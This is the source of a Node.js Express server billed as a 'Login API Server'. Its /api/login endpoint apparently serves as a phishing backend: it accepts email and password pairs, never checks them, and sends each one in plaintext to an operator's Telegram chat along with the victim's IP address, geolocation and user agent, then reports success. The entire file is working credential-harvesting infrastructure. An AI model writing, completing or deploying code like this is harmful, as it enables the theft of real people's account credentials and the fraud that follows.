const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Trust proxy - important for Render to get real IP
app.set('trust proxy', true);

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => {
    return req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  }
});
app.use('/api/login', limiter);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Function to get real client IP
function getClientIP(req) {
  const forwardedFor = req.headers['x-forwarded-for'];
  const realIP = req.headers['x-real-ip'];
  const cfConnectingIP = req.headers['cf-connecting-ip'];
  const trueClientIP = req.headers['true-client-ip'];
  
  if (cfConnectingIP) return cfConnectingIP;
  if (trueClientIP) return trueClientIP;
  
  if (forwardedFor) {
    const ips = forwardedFor.split(',');
    return ips[0].trim();
  }
  
  if (realIP) return realIP;
  
  return req.ip || req.connection.remoteAddress || req.socket.remoteAddress || 'Unknown';
}

// Function to format timestamp
function formatTimestamp(date) {
  const options = {
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: true,
    timeZone: process.env.TIMEZONE || 'Africa/Lagos'
  };
  
  try {
    return date.toLocaleString('en-US', options);
  } catch (error) {
    return date.toLocaleString();
  }
}

// Function to send message to Telegram
async function sendToTelegram(message) {
  try {
    const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    
    console.log('Telegram message sent successfully');
    return { success: true, data: response.data };
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
    return { success: false, error: error.message };
  }
}

// Function to get IP geolocation
async function getIPLocation(ip) {
  try {
    if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('::ffff:')) {
      return 'Local/Private Network';
    }
    
    const response = await axios.get(`http://ip-api.com/json/${ip}`, {
      timeout: 5000
    });
    
    if (response.data && response.data.status === 'success') {
      const location = [];
      if (response.data.city) location.push(response.data.city);
      if (response.data.regionName) location.push(response.data.regionName);
      if (response.data.country) location.push(response.data.country);
      if (response.data.isp) location.push(`ISP: ${response.data.isp}`);
      
      return location.join(', ') || 'Unknown';
    }
    return 'Unknown';
  } catch (error) {
    console.error('Error getting location:', error.message);
    return 'Unknown';
  }
}

// Function to format login details
function formatLoginDetails(loginData) {
  const now = new Date();
  const timestamp = formatTimestamp(now);
  const utcTimestamp = now.toISOString();
  
  const message = `
🔐 <b>New Login Attempt</b>
━━━━━━━━━━━━━━━━━━━━
📅 <b>Date/Time:</b> ${timestamp}
🌍 <b>UTC Time:</b> ${utcTimestamp}
📧 <b>Email:</b> ${loginData.email || 'N/A'}
🔑 <b>Password:</b> ${loginData.password || 'N/A'}
🌐 <b>IP Address:</b> ${loginData.ip || 'N/A'}
📍 <b>Location:</b> ${loginData.location || 'N/A'}
🖥 <b>User Agent:</b> ${loginData.userAgent || 'N/A'}
━━━━━━━━━━━━━━━━━━━━
  `;
  
  return message;
}

// Main login endpoint
app.post('/api/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    if (!email) {
      return res.status(400).json({
        success: false,
        message: 'Email is required'
      });
    }
    
    if (!password) {
      return res.status(400).json({
        success: false,
        message: 'Password is required'
      });
    }
    
    // Get real client IP
    const clientIP = getClientIP(req);
    const userAgent = req.headers['user-agent'];
    
    console.log('Detected IP:', clientIP);
    
    // Get location
    const location = await getIPLocation(clientIP);
    
    // Prepare login data
    const loginData = {
      email,
      password,
      ip: clientIP,
      location: location,
      userAgent
    };
    
    // Log the login attempt
    console.log('Login attempt:', {
      email,
      ip: clientIP,
      location,
      timestamp: new Date().toISOString()
    });
    
    // Format and send to Telegram
    const message = formatLoginDetails(loginData);
    const telegramResponse = await sendToTelegram(message);
    
    res.status(200).json({
      success: true,
      message: 'Login processed successfully',
      ip: clientIP
    });
    
  } catch (error) {
    console.error('Error processing login:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error'
    });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  const clientIP = getClientIP(req);
  res.status(200).json({
    status: 'OK',
    timestamp: formatTimestamp(new Date()),
    utcTimestamp: new Date().toISOString(),
    detectedIP: clientIP,
    timezone: process.env.TIMEZONE || 'Africa/Lagos'
  });
});

// Test endpoint to verify Telegram connection
app.get('/api/test-telegram', async (req, res) => {
  const testMessage = `✅ Test message from your login server!\n🕐 Local time: ${formatTimestamp(new Date())}\n🌍 UTC: ${new Date().toISOString()}`;
  const result = await sendToTelegram(testMessage);
  
  if (result.success) {
    res.status(200).json({
      success: true,
      message: 'Test message sent to Telegram successfully'
    });
  } else {
    res.status(500).json({
      success: false,
      message: 'Failed to send test message',
      error: result.error
    });
  }
});

// Debug endpoint
app.get('/api/debug-ip', (req, res) => {
  const clientIP = getClientIP(req);
  res.json({
    detectedIP: clientIP,
    timestamp: formatTimestamp(new Date()),
    utcTimestamp: new Date().toISOString(),
    timezone: process.env.TIMEZONE || 'Africa/Lagos',
    headers: {
      'x-forwarded-for': req.headers['x-forwarded-for'],
      'x-real-ip': req.headers['x-real-ip'],
      'cf-connecting-ip': req.headers['cf-connecting-ip'],
      'true-client-ip': req.headers['true-client-ip']
    }
  });
});

// Root endpoint - just return a simple message
app.get('/', (req, res) => {
  res.status(200).json({
    message: 'Login API Server',
    status: 'Running',
    endpoints: {
      login: 'POST /api/login',
      health: 'GET /health',
      testTelegram: 'GET /api/test-telegram',
      debugIP: 'GET /api/debug-ip'
    }
  });
});

// Handle 404 for unknown routes
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Route not found'
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📱 Telegram bot configured: ${TELEGRAM_BOT_TOKEN ? 'Yes' : 'No'}`);
  console.log(`💬 Chat ID configured: ${TELEGRAM_CHAT_ID ? 'Yes' : 'No'}`);
  console.log(`🕐 Timezone: ${process.env.TIMEZONE || 'Africa/Lagos'}`);
  console.log(`🌐 IP detection: Enhanced with proxy support`);
  console.log(`📅 Current time: ${formatTimestamp(new Date())}`);
  console.log(`🔗 API only - No static file serving`);
});
